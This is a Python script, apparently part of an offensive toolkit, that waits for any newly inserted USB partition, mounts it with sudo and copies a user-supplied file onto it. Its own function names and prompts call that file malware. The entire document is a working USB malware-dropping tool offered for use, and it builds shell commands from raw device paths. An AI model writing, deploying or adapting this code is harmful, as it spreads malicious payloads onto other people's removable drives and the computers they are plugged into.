import pyudev
from time import sleep
import platform
import sys
import os
import subprocess
import shutil
import time
import random
from appearance.hue import *
from appearance.error_handling import *
import errno

def upload_malware(addr):
    global dest
    global filename
    global c_val
    print(run("Uploading {} to {}...").format(filename, addr))
    try:
        os.makedirs("output")
    except OSError as e:
        if e.errno != errno.EEXIST:
            raise
    dir_name = "output/" + str(random.getrandbits(10))
    os.mkdir(dir_name)
    try:
        subprocess.call('sudo mount '+addr+' '+dir_name, shell=True)
        time.sleep(2)
    except:
        print(bad("Unable to mount {}: {}").format(addr,dir_name))
        f = open(dir_name+'/x', 'w+')
        f.close()
        shutil.rmtree(dir_name)
        return 1
    try:
        c_dir = os.getcwd()
        os.chdir(dir_name)
        os.chdir(c_dir)
        shutil.copyfile(dest,dir_name+'/'+filename)
        time.sleep(1)
        print(good("Copied {} to {} as {}").format(dest,addr, filename))
        time.sleep(0.2)
        try:
            time.sleep(2)
            subprocess.call('sudo umount '+addr, shell=True)
            time.sleep(1)
        except:
            print(bad("Could not dismount {}").format(addr))
            return 2
    except Exception as e:
        print(bad("Unable to write to: {} - Read Only System?").format(addr,))
        print (e)
        return 1
    time.sleep(2)
    c_dir = os.getcwd()
    os.chdir(dir_name)
    time.sleep(2)
    f = open('x', 'w+')
    f.close()
    time.sleep(1)
    os.chdir(c_dir)
    time.sleep(1.5)
    shutil.rmtree(dir_name)
    return 0

def run_usb_malware():
    global dest
    global filename
    print (info("Please type the full path of the file/malware to copy onto the device"))
    dest = raw_input(que("Path to file: ")) #'/home/filip/Desktop/DSCN0027.jpg'
    print (info("Here you can rename the file to whatever you like. Keep in mind that changing the file extension will render the file USELESS. Only change the file name if you know what you're doing. In most cases, it is best to keep the filename the same."))
    filename = raw_input(que("Name for file: "))
    num = random.randint(1,101)
    #dest = "output/usb-output-" + str(num) #raw_input(que('Where to copy files: '))
    context = pyudev.Context()
    monitor = pyudev.Monitor.from_netlink(context)
    monitor.filter_by(subsystem='block')

    current_partitions = []
    for device in context.list_devices(subsystem='block'):
        if(device.device_node not in current_partitions):
            print(info("Found device {} at Memory Location: {}").format(device.device_node, hex(id(device.device_node))))
            current_partitions.append(device.device_node)

    print(run("Waiting for a partition/USB device..."))
    for device in iter(monitor.poll, None):
        try:
            if device.action == 'add':
                if device.device_type == "partition":
                    print (info("Detected disk/partition: {}".format(device.device_node)))
                    #print(device.get('ID_FS_LABEL', 'unlabeled partition'))
                    data = upload_malware(device.device_node)
                    if(data == 1):
                        print(bad("The process was unsucessfully initiated on {} ").format(device.device_node))
                        break
                    elif(data == 2):
                        print(info("The process was successfully completed but could not dismount {} ").format(device.device_node))
                        break
                    elif(data == 0):
                        print(good("The process was completed successfully on {} ").format(device.device_node))
                        break
                else:
                    print (bad("Type disk detected but not a partition... moving on"))
            elif device.action == "remove":
                print (info("USB device removed"))
                continue
        except Exception as e:
            print (bad("Something happened! Printing error: "))
            print (e)
            run_error_handling(e)
            return
